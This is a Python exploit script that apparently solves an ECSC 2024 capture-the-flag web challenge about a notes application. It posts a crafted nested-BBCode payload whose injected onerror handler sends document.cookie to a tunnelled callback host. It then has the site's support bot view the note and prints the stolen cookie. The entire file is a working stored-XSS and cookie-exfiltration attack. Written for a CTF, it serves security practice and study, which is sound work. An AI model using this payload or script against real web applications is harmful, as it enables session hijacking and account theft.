#!/usr/bin/env python3

import logging
import os
import re
import secrets
from urllib.parse import unquote

import requests
import tunnel

logging.disable()

payload = '''[img]http://ciao.com/[math[math]][code]a[/code][/img][/math][img]http://a/onerror=location.href=`//{CALLBACK_HOST}/`+document.cookie//;[/img]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]
[i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math][i][math][/i][/math]'''

URL = os.environ.get("URL", "https://notes.challs.open.ecsc2024.it")
if URL.endswith("/"):
    URL = URL[:-1]

CHECKER_POW = os.environ.get('CHECKER_POW', 'redacted')


def main():
    sess = requests.Session()
    r = sess.get(URL + '/register.php')
    r.raise_for_status()

    username = secrets.token_hex(10)
    data = {
        'username': username,
        'csrf': sess.cookies['csrf']
    }
    r = sess.post(URL + '/register.php', data=data)
    r.raise_for_status()

    print('[*] registered user. Username: ' + username)

    with tunnel.open_http_tunnel(tls=True) as t:
        data = {
            'body': payload.format(CALLBACK_HOST=f'{t.remote_host}:{t.remote_port}'),
            'title': secrets.token_hex(5),
            'csrf': sess.cookies['csrf']
        }

        r = sess.post(URL + '/new.php', data=data, allow_redirects=False)
        r.raise_for_status()

        note_url = r.headers['Location']

        try:
            note_id = re.findall(r'=([a-f0-9]+)$', note_url)[0]
        except IndexError:
            print('[*] ERROR: Cannot submit notes')
            exit(1)

        print('[*] Note Id: ' + note_id)

        # Set pow_seed
        r = sess.get(URL + '/support.php')
        r.raise_for_status()

        data = {
            'pow': CHECKER_POW,
            'csrf': sess.cookies['csrf'],
            'url': note_id
        }
        r = sess.post(URL + '/support.php', data=data)
        r.raise_for_status()
        assert 'Thank you, our agent' in r.text

        print('[*] Support request sent')

        _, path, _, _ = t.wait_request()
        t.send_response(200, {}, b'')

        print(unquote(path))


if __name__ == '__main__':
    main()
